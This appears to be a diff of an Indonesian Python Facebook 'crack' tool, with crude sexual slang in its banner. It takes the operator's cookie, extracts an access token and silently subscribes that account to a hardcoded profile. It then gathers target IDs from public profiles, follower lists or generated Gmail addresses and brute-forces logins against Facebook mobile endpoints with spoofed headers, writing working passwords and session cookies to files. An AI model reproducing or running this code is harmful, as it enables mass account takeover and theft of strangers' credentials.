@@ -56,19 +56,20 @@ def jalan(keliling):
 def logo():
 	time.sleep (0.01)
 	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
-	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
-	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
-	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
-	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
-	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
-	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
-	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
-	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
-	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
-	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
-	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
-	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
-	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')
+	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟')
+	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋')
+	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋')
+	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉')
+	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀          \x1b[1;96mDiremas')
+	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀   \x1b[1;96mdoong')
+	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁   \x1b[1;96mbang')
+	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶   \x1b[1;96mbiar')
+	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟   \x1b[1;96mtambah ')
+	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋    \x1b[1;96mnikmat.....KKKKK')
+	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿')
+	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃')
+	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄')
+	jalan ('\x1b[1;92mC  O  L  M  E  X  S')
 
 def banner():                
 	os.system('clear')
@@ -85,15 +86,14 @@ def banner():
 def login():
 	try:
 		ses = requests.Session()
-		logo()
-		kukis = input(f'\n{P} Masukan \x1b[1;96mCOOKIE \x1b[1;97manda :{B} ')
+		kukis = input(f'\n{P} Masukan cookie anda :{K} ')
 		url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
 		ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
 		con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
 		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
 		open('data/token.txt','w').write(tokenB)
 		open('data/cookie.txt','w').write(kukis)
-		print (f"\n{B} + token:{P} {tokenB}");jeda(2)
+		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
 		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
 		print (f"\n{H} √ login berhasil");jeda(2)
 		menu()
@@ -129,13 +129,12 @@ def menu():
 			os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
 			exit(f'{M} ! cookie invalid')
 	except (FileNotFoundError,KeyError,IOError):
-#		print (f"{M} cookie invalid");jeda(2)
+#		print (f"{M} ! cookie invalid");jeda(2)
 		login()
 	except requests.exceptions.ConnectionError:
 		exit(f"{M} ! tidak ada koneksi")
 	banner()
-	print('')
-	print('')
+	print('\n')
 	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
 	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
 	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
@@ -146,20 +145,13 @@ def menu():
 	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
 	print('')
 	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
-	if romz in ['']:
-		print ("\n ! jangan kosong")
-	elif romz in ['1']:
-		publik(token,coki)
-	elif romz in ['2']:
-		massal(token,coki)
-	elif romz in ['3']:
-		search_name(data_,jum)
-	elif romz in ['4']:
-		hasil()
-	elif romz in ['5']:
-		hasil()
-	elif romz in ['6']:
-		hasil()
+	if romz in ['']:print ("\n ! jangan kosong")
+	elif romz in ['1']:publik(token,coki)
+	elif romz in ['2']:massal(token,coki)
+	elif romz in['3']:mail_name()
+	elif romz in['4']:follow(token,coki)
+	elif romz in['5']:exit()
+	elif romz in ['6']:hasil()
 	elif romz in ['7']:
 		crack().UA()
 		uas = open('ugent.txt','r').read()
@@ -169,7 +161,7 @@ def menu():
 		if us in['no','No','NO']:
 			exit()
 		elif us in['']:
-			uas = ("Mozilla/5.0 (Linux; U; Android 10; zh-cn; GM1910 Build/QKQ1.190716.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/40.7.24.1")
+			uas = ("Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; ru) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.391 Mobile Safari/534.11+")
 			open('ugent.txt','w').write(uas)
 		else:
 			open('ugent.txt','w').write(us)
@@ -247,34 +239,51 @@ def massal(token,cookie):
 	return crack().__xnx__(id)
 	     
 # CRACK PENCARIAN NAMA
-def search_name(data_,jum):
+def mail_name():
 	try:
-		true = False
-		kontol = requests.get(data_,cookies=romz_xyz(open("data/cookie.txt","r").read().strip())).text
-		memek = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
-		for i in memek:
-			if "profile.php?" in i[1]:
-				id.append(re.findall("id=(.*?)&amp;refid",i[1])[0]+"<=>"+i[2])
-			else:
-				id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
-			sys.stdout.write(f'\r{p}╰─{o} mengumpulkan ID{m} >{h} {len(id)} '),
+		print(f'{P} contoh: sayang,pengen,colmeks ')
+		nama = input(f' nama orang: ')
+		jumlah=int(input(' jumlah ID yang ingin di dump: '))
+		if "90000" in str(jumlah):
+			jumlah-=1
+		if jumlah<90001:
+			pass
+		else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
+		domain = "@gmail.com" #,"@yahoo.com"
+		for z in range(int(jumlah)):
+			if len(nama.split())>1:mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
+			else:mail = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
+			if mail in id:pass
+			else:id.append(mail)
+			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
 			sys.stdout.flush();jeda(0.0050)
-			if len(id)==jum:
-				true=True
-				break
-		if true==False:
-			if "Lihat Hasil Selanjutnya" in kontol:
-				search_name(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
-	except:
-		pass
-	print("")
+	except:pass
+	print ('')
 	if len(id)!=0:
-		return Crack().romiy(id)
+		return crack().__xnx__(id)
 	else:
-		exit('%s╰─%s gagal mengambil id'%(p,m))
+		exit(f'{M} ! gagal mengambil id')
+			
 # CRACK JUMLAH FOLLOWER
+def follow(token,cookie):
+	try:
+		user=input(f"\n{P} Masukan ID publik :\x1b[1;93m ")
+		if user in pepek:
+			exit("\n ! gk usah tolol")
+		else:
+			po = self.roomz.get(f"https://graph.facebook.com/{user}/subscribers?limit=6001&access_token={token}",cookies=cookie).json()
+			for i in po['data']:
+				id.append(f"{i['id']}<=>{i['name']}")
+			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
+			sys.stdout.flush();jeda(0.0050)
+	except KeyError:
+		exit(f"{M} gagal mengambil ID")
+	
+	print('')
+	return crack().__xnx__(id)
+
 # CRACK ANGGOTA GROUP
-	       
+
 # LIHAT HASIL
 oke,cepe=[],[]
 def hasil():
@@ -411,7 +420,7 @@ class crack:
 				elif men in['3']:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
-					titid.submit(self.__romz__, uid, pwx,  "m.alpha.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
 				else:
 					exit("\n ! isi yang benar")
 					
@@ -452,7 +461,7 @@ class crack:
 				elif men in['3']:
 					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
 				elif men in['4']:
-					titid.submit(self.__romz__, uid, pwx,  "graph.facebook.com")
+					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
 				else:
 					exit("\n ! isi yang benar")
 					
@@ -466,8 +475,8 @@ class crack:
 		for pw in peweh:
 			try: 
 				ses = requests.Session()
-				headex={"Host":url_log,"upgrade-insecure-requests":"1","user-agent":self.user_agentAPI(),"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":f"https://{url_log}/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-				ling = ses.get(f'https://{url_log}/',headers=headex).text 
+				headex={"Host":url_log,"upgrade-insecure-requests":"1","user-agent":self.UA(),"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":f"https://{url_log}/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+				ling = ses.get(f'https://{url_log}/login.php?',headers=headex).text 
 				times = int(datetime.now().timestamp())
 				dataa ={
 					'lsd':re.search('name="lsd" value="(.*?)"', str(ling)).group(1),
@@ -489,43 +498,42 @@ class crack:
 					'is_smart_lock':'false', 
 					'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(ling)).group(1),
 					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1),
-					'm_sess': '',
-					'__dyn': '',
-					'__csr': '',
-					'__req': random.choice(['1','2','3','4','5']), # 'd',
-					'__a': '',
-					'__user': '0'
+					#'m_sess': '',
+					#'__dyn': '',
+					#'__csr': '',
+					#'__req': random.choice(['1','2','3','4','5']), # 'd',
+					#'__a': '',
+					#'__user': '0'
 					}
-				ses.headers.update({ 
+				heades={
 					'Host': url_log,
 					'content-length': f"{len(str(dataa))}",
 					'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(ling)).group(1),
-					'user-agent': self.user_agentAPI(),
+					'user-agent': self.UA(),
 					'content-type': 'application/x-www-form-urlencoded',
 					'accept': '*/*', 
 					'origin': 'https://'+url_log,
 					'sec-fetch-site': 'same-origin',
 					'sec-fetch-mode': 'cors',
 					'sec-fetch-dest': 'empty', 
-					'referer': f'https://{url_log}/',
+					'referer': f'https://{url_log}/login.php?',
 					'accept-encoding': 'gzip, deflate, br',
 					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 					'cookie': (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
-				})
-				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, allow_redirects=False)
+				}
+				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, headers=heades, allow_redirects=False)
 				if 'c_user' in ses.cookies.get_dict().keys():
-					romz = ses.cookies.get_dict()
-					kukis = ";".join(x["name"]+"="+x["value"] for x in send.json()["session_cookies"])
-					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.user_agentAPI()} \n ')
-					rr = "{user} ◊ {pw} ◊ {kukis}"
-					ok.append(f"{rr}")
-					open(f'OK/{waktu}.txt', 'a').write(f" *--> {rr}\n")
+					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
+					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
+					info = f"{user} ◊ {pw} ◊ {kukis}"
+					ok.append(f"{info}")
+					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
 					break
 				elif 'checkpoint' in ses.cookies.get_dict().keys():
-					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.user_agentAPI()} \n ')
-					rr = '{user} ◊ {pw}'
-					cp.append(f'{rr}')
-					open(f'CP/{waktu}.txt', 'a').write(f" *--> {rr}\n")
+					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
+					info = f'{user} ◊ {pw}'
+					cp.append(f'{info}')
+					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
 					break
 				else:
 					continue
@@ -543,12 +551,12 @@ class crack:
 		else:
 			exit(f"\n {M}× ops tidak mendapatkan hasil")
 	
-	# USER AGENT
+	#--- USER AGENT
 	def UA(self):
 		try:
 			uas = open('ugent.txt','r').read()
 		except (FileNotFoundError,IOError):
-			uas = ("Mozilla/5.0 (Linux; U; Android 10; zh-cn; GM1910 Build/QKQ1.190716.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/40.7.24.1")
+			uas = ("Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; ru) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.391 Mobile Safari/534.11+")
 			open('ugent.txt','w').write(uas)
 		
 		return uas 
